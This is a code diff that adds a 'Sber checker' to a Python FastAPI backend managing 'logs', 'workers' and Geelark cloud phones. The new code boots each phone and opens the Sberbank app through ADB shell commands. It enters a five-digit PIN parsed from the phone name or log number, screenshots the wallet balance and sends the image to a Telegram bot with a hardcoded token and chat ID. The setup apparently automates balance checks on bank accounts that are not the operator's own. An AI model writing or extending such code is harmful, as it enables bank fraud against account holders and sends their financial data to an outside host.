@@ -11,7 +11,7 @@ import os
 import secrets
 
 from database import get_db, init_db
-from models import Log, Worker, LogTag, User, UserRole, Session, AuditLog, LogNote, CustomTag, GeelarkSettings, GeelarkGroupMapping, GeelarkSyncedPhone
+from models import Log, Worker, LogTag, User, UserRole, Session, AuditLog, LogNote, CustomTag, GeelarkSettings, GeelarkGroupMapping, GeelarkSyncedPhone, CheckResult
 import json
 import aiohttp
 import uuid
@@ -1829,6 +1829,381 @@ async def fetch_geelark_groups(user: User = Depends(get_current_user), db: Async
         return {"ok": True, "groups": list(groups.values())}
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
+
+
+# ==================== SBER CHECKER ====================
+
+# SberChecker settings
+SBER_TELEGRAM_BOT_TOKEN = "8265738545:AAHC24JkvGH5LozrgvHVNUms1oT3EEnPNLw"
+SBER_TELEGRAM_CHAT_ID = "7888080337"
+
+# PIN pad coordinates
+PIN_BUTTONS_A12 = {
+    "1": (140, 780), "2": (360, 780), "3": (580, 780),
+    "4": (140, 890), "5": (360, 890), "6": (580, 890),
+    "7": (140, 1000), "8": (360, 1000), "9": (580, 1000),
+    "0": (360, 1130),
+}
+PIN_BUTTONS_A15 = {
+    "1": (140, 830), "2": (360, 830), "3": (580, 830),
+    "4": (140, 950), "5": (360, 950), "6": (580, 950),
+    "7": (140, 1070), "8": (360, 1070), "9": (580, 1070),
+    "0": (360, 1190),
+}
+
+# Timings
+SBER_BOOT_WAIT = 120
+SBER_OPEN_WAIT = 8
+SBER_PIN_WAIT = 0.6
+SBER_BALANCE_WAIT = 15
+SBER_KOSHELEK_WAIT = 5
+
+# Store for active check
+active_sber_check = {"running": False, "progress": 0, "total": 0, "current": ""}
+
+
+async def sber_shell_execute(phone_id: str, cmd: str, settings) -> dict:
+    """Execute shell command on Geelark phone"""
+    return await geelark_request("/shell/execute", {"id": phone_id, "cmd": cmd}, settings)
+
+
+async def sber_start_phone(phone_id: str, settings) -> bool:
+    """Start Geelark phone"""
+    result = await geelark_request("/phone/start", {"ids": [phone_id], "energySavingMode": 1}, settings)
+    if result.get("code") == 0:
+        return result.get("data", {}).get("successAmount", 0) > 0
+    return False
+
+
+async def sber_get_android_version(phone_id: str, settings) -> int:
+    """Get Android version"""
+    result = await sber_shell_execute(phone_id, "getprop ro.build.version.release", settings)
+    if result.get("code") == 0:
+        output = result.get("data", {}).get("output", "").strip()
+        try:
+            return int(output)
+        except:
+            return 12
+    return 12
+
+
+async def sber_take_screenshot(phone_id: str, settings) -> bytes:
+    """Take screenshot and return bytes"""
+    import base64
+    await sber_shell_execute(phone_id, "screencap -p /sdcard/screen.png", settings)
+    await asyncio.sleep(0.5)
+    
+    result = await sber_shell_execute(phone_id, "base64 /sdcard/screen.png", settings)
+    if result.get("code") != 0:
+        return None
+    
+    output = result.get("data", {}).get("output", "")
+    if not output:
+        return None
+    
+    output = output.strip().replace('\n', '').replace('\r', '')
+    padding = 4 - len(output) % 4
+    if padding != 4:
+        output += '=' * padding
+    
+    try:
+        return base64.b64decode(output)
+    except:
+        return None
+
+
+async def sber_send_telegram(image_bytes: bytes, caption: str) -> bool:
+    """Send screenshot to Telegram"""
+    import aiohttp
+    url = f"https://api.telegram.org/bot{SBER_TELEGRAM_BOT_TOKEN}/sendPhoto"
+    
+    data = aiohttp.FormData()
+    data.add_field('chat_id', SBER_TELEGRAM_CHAT_ID)
+    data.add_field('caption', caption)
+    data.add_field('parse_mode', 'HTML')
+    data.add_field('photo', image_bytes, filename='screenshot.png', content_type='image/png')
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, data=data) as resp:
+                result = await resp.json()
+                return result.get("ok", False)
+    except:
+        return False
+
+
+import asyncio
+
+async def process_single_phone_check(log: Log, phone: dict, settings, db: AsyncSession) -> dict:
+    """Process single phone for Sberbank check"""
+    phone_id = phone.get("id")
+    phone_name = phone.get("serialName", "Unknown")
+    phone_serial = phone.get("serialNo", "")
+    status = phone.get("status")
+    remark = phone.get("remark", "")
+    
+    result = {
+        "log_id": log.id,
+        "geelark_phone_id": phone_id,
+        "phone_name": phone_name,
+        "phone_serial": phone_serial,
+        "status": "error",
+        "error_message": None,
+        "screenshot_url": None
+    }
+    
+    # Extract PIN from log_number or phone_name
+    pin_match = re.search(r'\b(\d{5})\b', phone_name)
+    if not pin_match:
+        pin_match = re.search(r'\b(\d{5})\b', log.log_number)
+    
+    if not pin_match:
+        result["status"] = "skipped"
+        result["error_message"] = "PIN не найден"
+        return result
+    
+    pin = pin_match.group(1)
+    
+    try:
+        # Start phone if needed
+        if status == 2:
+            if not await sber_start_phone(phone_id, settings):
+                result["error_message"] = "Не удалось запустить телефон"
+                return result
+            await asyncio.sleep(SBER_BOOT_WAIT)
+        elif status == 1:
+            await asyncio.sleep(SBER_BOOT_WAIT)
+        
+        # Get Android version
+        android_ver = await sber_get_android_version(phone_id, settings)
+        pin_buttons = PIN_BUTTONS_A15 if android_ver >= 15 else PIN_BUTTONS_A12
+        
+        # Check Sberbank installed
+        check = await sber_shell_execute(phone_id, "pm path ru.sberbankmobile", settings)
+        sber_path = check.get("data", {}).get("output", "")
+        if not sber_path or "package:" not in sber_path:
+            result["status"] = "skipped"
+            result["error_message"] = "Sberbank не установлен"
+            return result
+        
+        # Close Sberbank
+        await sber_shell_execute(phone_id, "am force-stop ru.sberbankmobile", settings)
+        await asyncio.sleep(2)
+        
+        # Open Sberbank
+        await sber_shell_execute(phone_id, "monkey -p ru.sberbankmobile -c android.intent.category.LAUNCHER 1", settings)
+        await asyncio.sleep(3)
+        await sber_shell_execute(phone_id, "am start -n ru.sberbankmobile/.host.ui.HostActivity", settings)
+        await asyncio.sleep(SBER_OPEN_WAIT)
+        
+        # Close dialogs
+        for _ in range(5):
+            await sber_shell_execute(phone_id, "input tap 25 50", settings)
+            await asyncio.sleep(1)
+        
+        # Enter PIN
+        for digit in pin:
+            x, y = pin_buttons[digit]
+            await sber_shell_execute(phone_id, f"input tap {x} {y}", settings)
+            await asyncio.sleep(SBER_PIN_WAIT)
+        
+        # Wait for balance
+        await asyncio.sleep(SBER_BALANCE_WAIT)
+        
+        # Tap Koshelek
+        await sber_shell_execute(phone_id, "input tap 130 175", settings)
+        await asyncio.sleep(SBER_KOSHELEK_WAIT)
+        
+        # Take screenshot
+        screenshot = await sber_take_screenshot(phone_id, settings)
+        if not screenshot:
+            result["error_message"] = "Не удалось сделать скриншот"
+            return result
+        
+        # Send to Telegram
+        caption = f"<b>#{phone_serial}</b>\n"
+        caption += f"<b>{phone_name}</b>\n"
+        if remark:
+            caption += f"{remark}\n"
+        caption += f"\n{datetime.now().strftime('%d.%m.%Y %H:%M')}"
+        
+        if await sber_send_telegram(screenshot, caption):
+            result["status"] = "success"
+            # Save screenshot as base64 for display
+            import base64
+            result["screenshot_url"] = f"data:image/png;base64,{base64.b64encode(screenshot).decode()}"
+        else:
+            result["error_message"] = "Не удалось отправить в Telegram"
+        
+    except Exception as e:
+        result["error_message"] = str(e)
+    
+    return result
+
+
+@app.get("/api/sber-check/results")
+async def get_sber_check_results(user: User = Depends(get_current_user), db: AsyncSession = Depends(get_db)):
+    """Получить результаты проверки"""
+    if user.role != UserRole.ADMIN:
+        raise HTTPException(status_code=403, detail="Только для админа")
+    
+    result = await db.execute(
+        select(CheckResult).options(selectinload(CheckResult.log)).order_by(CheckResult.checked_at.desc())
+    )
+    results = result.scalars().all()
+    
+    return {
+        "results": [r.to_dict() for r in results],
+        "active": active_sber_check
+    }
+
+
+@app.delete("/api/sber-check/results")
+async def clear_sber_check_results(user: User = Depends(get_current_user), db: AsyncSession = Depends(get_db)):
+    """Очистить результаты проверки"""
+    if user.role != UserRole.ADMIN:
+        raise HTTPException(status_code=403, detail="Только для админа")
+    
+    await db.execute(select(CheckResult).execution_options(synchronize_session="fetch"))
+    # Delete all results
+    from sqlalchemy import delete
+    await db.execute(delete(CheckResult))
+    await db.commit()
+    
+    return {"ok": True, "message": "Результаты очищены"}
+
+
+@app.post("/api/sber-check/start")
+async def start_sber_check(
+    log_ids: list[int],
+    user: User = Depends(get_current_user),
+    db: AsyncSession = Depends(get_db)
+):
+    """Запустить проверку выбранных логов"""
+    global active_sber_check
+    
+    if user.role != UserRole.ADMIN:
+        raise HTTPException(status_code=403, detail="Только для админа")
+    
+    if active_sber_check["running"]:
+        raise HTTPException(status_code=400, detail="Проверка уже запущена")
+    
+    # Get Geelark settings
+    settings_result = await db.execute(select(GeelarkSettings).limit(1))
+    settings = settings_result.scalar_one_or_none()
+    
+    if not settings or not settings.bearer_token:
+        raise HTTPException(status_code=400, detail="Geelark не настроен")
+    
+    # Get logs with their geelark_phone_id
+    logs_result = await db.execute(
+        select(Log).where(Log.id.in_(log_ids))
+    )
+    logs = logs_result.scalars().all()
+    
+    if not logs:
+        raise HTTPException(status_code=400, detail="Логи не найдены")
+    
+    # Clear previous results
+    from sqlalchemy import delete
+    await db.execute(delete(CheckResult))
+    await db.commit()
+    
+    # Get phone IDs from synced phones table
+    synced_result = await db.execute(
+        select(GeelarkSyncedPhone).where(GeelarkSyncedPhone.log_id.in_(log_ids))
+    )
+    synced_phones = {sp.log_id: sp.geelark_phone_id for sp in synced_result.scalars().all()}
+    
+    # Get all phones from Geelark
+    all_phones = []
+    page = 1
+    while True:
+        response = await geelark_request("/phone/list", {"page": page, "pageSize": 100}, settings)
+        if response.get("code") != 0:
+            break
+        items = response.get("data", {}).get("items", [])
+        all_phones.extend(items)
+        total = response.get("data", {}).get("total", 0)
+        if len(all_phones) >= total:
+            break
+        page += 1
+    
+    phones_by_id = {p["id"]: p for p in all_phones}
+    
+    # Start background task
+    active_sber_check = {"running": True, "progress": 0, "total": len(logs), "current": ""}
+    
+    async def run_checks():
+        global active_sber_check
+        try:
+            for i, log in enumerate(logs):
+                active_sber_check["progress"] = i
+                active_sber_check["current"] = log.log_number
+                
+                # Find phone for this log
+                phone_id = synced_phones.get(log.id) or log.geelark_phone_id
+                
+                if not phone_id or phone_id not in phones_by_id:
+                    # Try to find by log_number
+                    phone = None
+                    for p in all_phones:
+                        if log.log_number in p.get("serialName", "") or log.log_number in p.get("serialNo", ""):
+                            phone = p
+                            break
+                    
+                    if not phone:
+                        result_data = {
+                            "log_id": log.id,
+                            "phone_name": "",
+                            "phone_serial": "",
+                            "status": "skipped",
+                            "error_message": "Телефон не найден в Geelark"
+                        }
+                        check_result = CheckResult(**result_data)
+                        async with AsyncSession(db.get_bind()) as session:
+                            session.add(check_result)
+                            await session.commit()
+                        continue
+                else:
+                    phone = phones_by_id[phone_id]
+                
+                # Process phone
+                result_data = await process_single_phone_check(log, phone, settings, db)
+                
+                # Save result
+                check_result = CheckResult(
+                    log_id=result_data["log_id"],
+                    geelark_phone_id=result_data.get("geelark_phone_id"),
+                    phone_name=result_data.get("phone_name"),
+                    phone_serial=result_data.get("phone_serial"),
+                    status=result_data["status"],
+                    error_message=result_data.get("error_message"),
+                    screenshot_url=result_data.get("screenshot_url")
+                )
+                db.add(check_result)
+                await db.commit()
+                
+                # Wait between phones
+                if i < len(logs) - 1:
+                    await asyncio.sleep(10)
+                    
+        finally:
+            active_sber_check = {"running": False, "progress": len(logs), "total": len(logs), "current": "Завершено"}
+    
+    # Run in background
+    asyncio.create_task(run_checks())
+    
+    return {"ok": True, "message": f"Проверка запущена для {len(logs)} логов"}
+
+
+@app.get("/api/sber-check/status")
+async def get_sber_check_status(user: User = Depends(get_current_user)):
+    """Получить статус текущей проверки"""
+    if user.role != UserRole.ADMIN:
+        raise HTTPException(status_code=403, detail="Только для админа")
+    
+    return active_sber_check
 
 
 if __name__ == "__main__":
